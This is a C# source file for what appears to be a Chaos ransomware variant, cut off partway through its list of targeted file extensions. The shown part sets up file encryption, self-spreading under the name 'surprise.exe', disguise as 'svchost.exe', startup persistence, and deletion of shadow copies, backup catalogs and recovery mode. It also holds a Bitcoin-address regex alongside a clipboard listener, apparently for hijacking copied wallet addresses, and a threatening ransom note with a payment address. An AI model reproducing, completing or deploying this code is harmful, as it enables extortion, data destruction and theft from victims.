using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = false;

	private static int sleepTextbox = 10;

	private static string base64Image = "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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA3phUr/j+rK/WDvOH4mAAAAABJRU5ErkJggg==";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "Readme.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[19]
	{
		"Dear user,", "Your files have been encrypted by Chaos ransomware using RSA 2048 and AES 256 ciphers, wich means you cannot access them anymore.", "In order to restore your data you have to purchase our decryption software.", "How do i pay?", "Payment is bitcoin ONLY, no negotiation. Bitcoin adress is listed below.", "How do i get bitcoin?", "Figure out yourself idiot.", "How much do i need to pay?", "Price will depend on value of data and company size, if you a regular individual the standard price of ", "1,500 Euro in btc is accepted. However if your a big company or a school etc.. price as much as 2 million Euro will be negotiated. (IF YOU THINK YOU CAN TRICK US PLEASE KNOW THAT WE SAVED ALL YOUR PERSONAL DATA ON OUR SERVER DONT TRY TO PLAY GAMES WITH US)",
		"How can i trust?", "What other options do you have?, Trying to decrypt the files by yourself will corrupt them completly and will result in an imposible recovery even with our decryption software. ", "What happens if i dont pay, how much time do i have?", "You have 3 days from launch of this programm to fulfill your payment if payment has not been made in thos matter of time your files will be lost FOREVER, additionaly all files saved on our server will be sold on the Dark web.", "I have paid what do i do now?", "Once you have paid please contact me from the adress listed below, please send your bitcoin transaction id as a proof of payment and wait for a response.", "", "Contact: bitcoinfun_666@proton.me", "Bitcoin adress: bc1ql4an2gnfa4gp66dzvphyyn4m5d8vsn4tw4envdg"
	};

	private static string[] validExtensions = new string[230]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
